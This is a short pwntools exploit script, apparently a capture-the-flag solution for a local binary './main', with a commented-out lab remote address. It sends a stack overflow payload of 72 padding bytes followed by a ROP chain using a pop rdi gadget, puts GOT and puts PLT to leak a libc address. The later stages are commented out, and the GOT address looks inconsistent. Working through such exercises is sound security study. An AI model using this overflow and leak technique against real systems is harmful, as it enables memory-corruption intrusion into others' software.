from pwn import *

#p = remote("10.100.101.107",22000)
p = process("./main")

pop_rdi = p64(0x0000000000401243)
puts_plt = p64(0x0000000000401060)
puts_got = p64(0x0000000000401064)
main = p64(0x00000000004011a9)
ret = p64(0x000000000040101a)
otfunc = p64(0x0000000000401176)

payload = b"a"*72
payload += pop_rdi
payload += puts_got
payload += puts_plt
#payload += main

print(p.recv())
p.sendline(payload)
print(p.recv(6))
#leak = u64(p.recv(6)+b"\x00\x00")
#print(hex(leak))
